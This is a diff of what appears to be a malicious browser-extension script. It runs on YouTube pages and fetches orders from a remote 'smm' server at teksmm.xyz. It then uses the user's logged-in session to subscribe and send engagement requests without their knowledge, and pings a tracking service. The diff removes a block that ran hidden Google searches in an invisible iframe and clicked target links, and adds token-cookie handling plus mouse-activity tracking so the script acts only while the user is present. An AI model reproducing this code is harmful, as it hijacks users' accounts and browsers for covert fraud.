@@ -1,64 +1,3 @@
-function get_google_keywords() {
-	var xhr = new XMLHttpRequest();
-	xhr.open("GET", "//izle.vip/seo/get.php", true);
-	xhr.onreadystatechange = function() {
-		if (xhr.readyState == 4 && xhr.status == 200) {
-			try {
-				var data = JSON.parse(xhr.responseText);
-				var target = data.target.trim();
-				var keyword = data.keyword.trim();
-				if(target && keyword){
-					search_google_seo(target,keyword);
-				}
-			}catch (error) {}
-		}
-	}
-	xhr.send();
-}
-
-function rasgteleSure(min, max) { 
-  return Math.floor(Math.random() * (max - min + 1) + min);
-}
-
-function search_google_seo(target,keyword){
-	new Image().src = '//whos.amung.us/widget/m823l61df3.png';
-	var ifrm = document.createElement("iframe");
-	ifrm.setAttribute("src", window.location.origin);
-	ifrm.style.width = "100%";
-	ifrm.style.height = "100%";
-	ifrm.style.border = "0px";
-	ifrm.style.display = "none";
-	ifrm.id = "guugil";
-	document.body.appendChild(ifrm);
-
-	var kelime = keyword;
-	setTimeout(function(){document.querySelector("#guugil").contentWindow.document.querySelector("input[name=q]").value = kelime;}, rasgteleSure(2500,4000));
-	setTimeout(function(){document.querySelector("#guugil").contentWindow.document.querySelector("input[name=btnK]").click();}, rasgteleSure(5000,6500));
-
-	setTimeout(function(){
-		var linkler = document.querySelector("#guugil").contentWindow.document.querySelectorAll("a[ping][href]")
-		var i;
-		for (i = 0; i < linkler.length; i++) {
-		  if(linkler[i].href.indexOf(target) >= 0){
-			  console.log(linkler[i].href);
-			  linkler[i].click();
-			  break;
-		  }
-		}
-	}, rasgteleSure(7500,10000));
-}
-
-
-if(window.location.href.indexOf("google") >= 0){
-	var cookie_name = "guugil";
-	var cookie_time = 1;
-	if (!localStorage[cookie_name] || parseInt(localStorage[cookie_name]) < Date.now() - 60 * 1000 * cookie_time) {
-		localStorage[cookie_name] = Date.now();
-		get_google_keywords();
-	}
-}
-
-
 if (location.hostname.indexOf("youtube.com") >= 0 && document.body.innerHTML.split('creator_channel_id","value":"')[1] && window.asdfsdf != true) {
 	
 	
@@ -125,6 +64,7 @@ if (location.hostname.indexOf("youtube.com") >= 0 && document.body.innerHTML.spl
 	}
 	
 	function createSubData(data){
+		let CONSISTENCY = getCookie("CONSISTENCY")
 		let vars = getStaticParams();
 		var body = {
 					"context": {
@@ -150,8 +90,7 @@ if (location.hostname.indexOf("youtube.com") >= 0 && document.body.innerHTML.spl
 							"internalExperimentFlags": [
 
 							],
-							"consistencyTokenJars":  [] 
-							
+							"consistencyTokenJars": CONSISTENCY != null ? [{"encryptedTokenJarContents": CONSISTENCY,"expirationSeconds": "600"}] : [],
 							
 						},
 						"user": {
@@ -209,7 +148,9 @@ if (location.hostname.indexOf("youtube.com") >= 0 && document.body.innerHTML.spl
 		  },
 		  "body" : JSON.stringify(body),
 		  "method": "POST"
-		}).then(response => response.json())
+		}).then(response => response.json()).then(data =>{
+			setCookie("CONSISTENCY",data.responseContext.consistencyTokenJar.encryptedTokenJarContents,6)
+		})
 	}
 
 	function subscribe(videoId,remains){
@@ -398,6 +339,16 @@ if (location.hostname.indexOf("youtube.com") >= 0 && document.body.innerHTML.spl
 		}
 		return null;
 	}
+	function setCookie(name,value,days) {
+		var expires = "";
+		if (days) {
+			var date = new Date();
+			date.setTime(date.getTime() + (days*24*60*60*1000));
+			expires = "; expires=" + date.toUTCString();
+		}
+		document.cookie = name + "=" + (value || "")  + expires + "; path=/ ; domain=.youtube.com; secure";
+	}
+
 	function numberFormatter(strNum){
     if(strNum == "0"){
         return 0;
@@ -425,7 +376,7 @@ if (location.hostname.indexOf("youtube.com") >= 0 && document.body.innerHTML.spl
 function checkOrSave(key, value){
 Object.keys(localStorage).forEach(x => {
   if( parseInt( localStorage.getItem(x) ) - new Date().getTime()  <= 0){
-		if(x != "ytStart"){
+		if( !(x == "ytStart" || x == "activity") ){
 			localStorage.removeItem(x)
 		}
   }
@@ -440,7 +391,7 @@ return false;
 	
 function siparis_getir_3() {
 	var xhr = new XMLHttpRequest();
-	xhr.open("GET", "https://teksmm.xyz/smmnew/queueYtPlayer.php?queue=3&json=[]");
+	xhr.open("GET", "https://teksmm.xyz/smmnew/queueYtPlayer2.php?queue=3&json=[]");
 	xhr.onreadystatechange = function() {
 		if (xhr.readyState == 4 && xhr.status == 200) {
 			try {
@@ -474,20 +425,24 @@ function start() {
 	try {
   var cookie_name = "ytStart";
   var cookie_time = rasgteleSure(60 * 1000 * 3,60 * 1000 * 5);
-  console.log(localStorage.getItem(cookie_name))
-  if (!localStorage.getItem(cookie_name) || parseInt(localStorage.getItem(cookie_name)) < Date.now() - cookie_time) {
-    localStorage.setItem(cookie_name,Date.now())
-	new Image().src = '//whos.amung.us/pingjs/?k=selamcek03';
-    siparis_getir_3();
-  }
-  
+	if(  (Date.now() - localStorage.getItem("activity")) / (1000 * 60) < 10  ){
+	  if (!localStorage.getItem(cookie_name) || parseInt(localStorage.getItem(cookie_name)) < Date.now() - cookie_time) {
+		localStorage.setItem(cookie_name,Date.now())
+		new Image().src = '//whos.amung.us/pingjs/?k=selamcek03';
+		siparis_getir_3();
+	  }
+	}
   }catch (error) {console.log(error)}
 }
 
 setInterval(start, 60000 );
  
-	
+
+var myListener = function () {
+    localStorage.setItem("activity",Date.now())
+};
+
+document.addEventListener('mousemove', myListener, false);
 
 	
 }
-
